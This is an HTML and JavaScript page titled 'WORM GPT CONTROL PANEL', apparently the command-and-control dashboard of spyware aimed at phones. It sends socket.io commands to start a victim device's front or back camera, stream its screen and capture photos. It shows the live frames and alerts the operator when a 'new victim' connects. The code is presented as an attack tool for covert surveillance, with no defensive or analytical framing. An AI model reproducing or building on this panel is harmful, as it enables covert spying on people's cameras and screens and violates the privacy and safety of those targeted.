<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>WORM GPT CONTROL PANEL</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; margin: 0; overflow: hidden; }
        #monitor { width: 100vw; height: calc(100vh - 140px); background: #050505; display: flex; align-items: center; justify-content: center; position: relative; }
        #liveImg { height: 98%; width: auto; max-width: 98%; object-fit: contain; border: 1px solid #222; }
        .status { position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.8); padding: 5px 15px; border: 1px solid #0f0; border-radius: 5px; }
        .controls { height: 140px; background: #111; border-top: 2px solid #0f0; display: flex; flex-wrap: wrap; justify-content: center; align-items: center; gap: 8px; padding: 5px; }
        button { background: #0f0; color: #000; padding: 12px 18px; border: none; font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 13px; }
        button:hover { background: #fff; }
        .btn-stop { background: #f00; color: #fff; }
    </style>
</head>
<body>
    <div id="monitor">
        <div class="status" id="stat">🔴 OFFLINE</div>
        <img id="liveImg" src="">
    </div>
    <div class="controls">
        <button onclick="send('start_camera_back')">📸 كاميرا خلفية</button>
        <button onclick="send('start_camera_front')">🤳 كاميرا أمامية</button>
        <button onclick="send('start_screen')">📱 بث الشاشة</button>
        <button onclick="send('take_photo')">🖼️ التقاط صورة</button>
        <button onclick="send('stop_all')" class="btn-stop">🛑 إيقاف الكل</button>
        <button onclick="location.reload()">🔄 تحديث</button>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const img = document.getElementById('liveImg');
        const stat = document.getElementById('stat');

        socket.on('new_victim_alert', d => {
            stat.innerText = "🟢 ONLINE: " + d.model;
            stat.style.color = "#0f0";
        });

        socket.on('display_frame', d => { img.src = "data:image/jpeg;base64," + d.frame; });

        socket.on('display_photo', d => {
            img.src = "data:image/jpeg;base64," + d.img;
            alert("تم استلام صورة بدقة عالية!");
        });

        function send(cmd) { socket.emit('admin_command', { command: cmd }); }
    </script>
</body>
</html>
